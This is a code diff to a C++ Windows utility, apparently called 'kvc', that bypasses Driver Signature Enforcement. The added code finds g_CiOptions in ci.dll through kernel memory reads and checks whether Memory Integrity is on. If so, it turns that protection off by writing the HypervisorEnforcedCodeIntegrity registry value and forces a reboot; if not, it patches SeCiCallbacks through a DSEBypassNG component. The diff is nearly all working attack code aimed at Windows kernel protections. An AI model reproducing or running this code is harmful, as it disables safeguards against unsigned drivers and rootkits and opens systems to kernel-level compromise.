@@ -113,7 +113,7 @@ bool Controller::DisableDSE() noexcept {
     DWORD currentValue = current.value();
     DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
     
-    bool hvciEnabled = (currentValue & 0x0001C000) != 0;
+    bool hvciEnabled = (currentValue & 0x0001C000) == 0x0001C000;  // Memory Integrity ON - requires reboot
     
 if (hvciEnabled) {
     INFO(L"HVCI detected (g_CiOptions = 0x%08X) - hypervisor bypass required", currentValue);
@@ -230,12 +230,101 @@ bool Controller::DisableDSESafe() noexcept {
         return false;
     }
 
+    // Check g_CiOptions to determine if Memory Integrity is enabled
+    if (!m_dseBypass) {
+        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
+    }
+
+    auto ciBase = m_dseBypass->GetKernelModuleBase("ci.dll");
+    if (!ciBase) {
+        ERROR(L"Failed to locate ci.dll");
+        EndDriverSession(true);
+        return false;
+    }
+
+    ULONG_PTR ciOptionsAddr = m_dseBypass->FindCiOptions(ciBase.value());
+    if (!ciOptionsAddr) {
+        ERROR(L"Failed to locate g_CiOptions");
+        EndDriverSession(true);
+        return false;
+    }
+
+    auto current = m_rtc->Read32(ciOptionsAddr);
+    if (!current) {
+        ERROR(L"Failed to read g_CiOptions");
+        EndDriverSession(true);
+        return false;
+    }
+
+    DWORD currentValue = current.value();
+    bool hvciEnabled = (currentValue & 0x0001C000) == 0x0001C000;  // Memory Integrity ON - requires reboot
+
+    if (hvciEnabled) {
+        INFO(L"Memory Integrity is enabled (g_CiOptions = 0x%08X)", currentValue);
+        INFO(L"A reboot is required to disable Memory Integrity before DSE bypass");
+        std::wcout << L"\n";
+        std::wcout << L"Disable Memory Integrity and reboot now? [Y/N]: ";
+        wchar_t choice;
+        std::wcin >> choice;
+
+        if (choice != L'Y' && choice != L'y') {
+            INFO(L"Operation cancelled by user");
+            m_rtc->Cleanup();
+            EndDriverSession(true);
+            return true;
+        }
+
+        // Set HVCI registry to 0
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
+                          L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
+                          0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            DWORD disabled = 0;
+            RegSetValueExW(hKey, L"Enabled", 0, REG_DWORD, 
+                          reinterpret_cast<const BYTE*>(&disabled), sizeof(DWORD));
+            RegCloseKey(hKey);
+            SUCCESS(L"Memory Integrity disabled in registry");
+        } else {
+            ERROR(L"Failed to modify HVCI registry key");
+            m_rtc->Cleanup();
+            EndDriverSession(true);
+            return false;
+        }
+
+        // Cleanup driver before reboot
+        m_rtc->Cleanup();
+        EndDriverSession(true);
+
+        INFO(L"Initiating system reboot...");
+        INFO(L"After reboot, run 'kvc dse off --safe' again to complete DSE bypass");
+
+        // Enable shutdown privilege and reboot
+        HANDLE hToken;
+        TOKEN_PRIVILEGES tkp;
+
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+            LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
+            tkp.PrivilegeCount = 1;
+            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
+            CloseHandle(hToken);
+        }
+
+        if (InitiateShutdownW(NULL, NULL, 0, SHUTDOWN_RESTART | SHUTDOWN_FORCE_OTHERS, 
+                              SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != ERROR_SUCCESS) {
+            ERROR(L"Failed to initiate reboot: %d", GetLastError());
+        }
+
+        return true;
+    }
+
+    // Memory Integrity is OFF - proceed with SeCiCallbacks patch
     if (!m_dseBypassNG) {
         m_dseBypassNG = std::make_unique<DSEBypassNG>(m_rtc);
     }
 
     bool result = m_dseBypassNG->DisableDSE();
-    EndDriverSession(true); // Always close session after DSE op
+    EndDriverSession(true);
     return result;
 }
 
